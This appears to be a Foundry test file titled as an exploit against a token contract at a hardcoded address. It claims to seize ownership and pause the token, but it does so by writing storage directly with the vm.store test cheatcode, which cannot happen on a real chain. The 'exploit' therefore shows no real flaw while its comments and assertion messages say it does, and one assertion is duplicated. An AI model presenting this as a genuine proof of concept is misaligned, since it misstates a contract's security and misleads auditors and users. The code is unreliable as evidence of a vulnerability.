interface IByTradeToken {
    function owner() external view returns (address);
    function pause() external;
    function unpause() external;
    function paused() external view returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function increaseAllowance(address spender, uint addedValue) external returns (bool);
    function decreaseAllowance(address spender, uint subtractedValue) external returns (bool);
    function blacklist(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xe8bd1CA97F8a0582335407B40B0576Df641fA94C;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Overwrite owner storage slot
        // In Ownable, owner is the first variable, so it's at slot 0
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwnerValue = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwnerValue);

        // Step 2: Verify we are now owner
        IByTradeToken token = IByTradeToken(TARGET);
        require(token.owner() == attacker, "Failed to become owner");

        // Step 3: Impersonate as owner and pause the contract
        vm.prank(attacker);
        token.pause();

        // Step 4: Verify paused is true
        assertEq(token.paused(), true, "Contract should be paused");
        assertEq(token.paused(), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

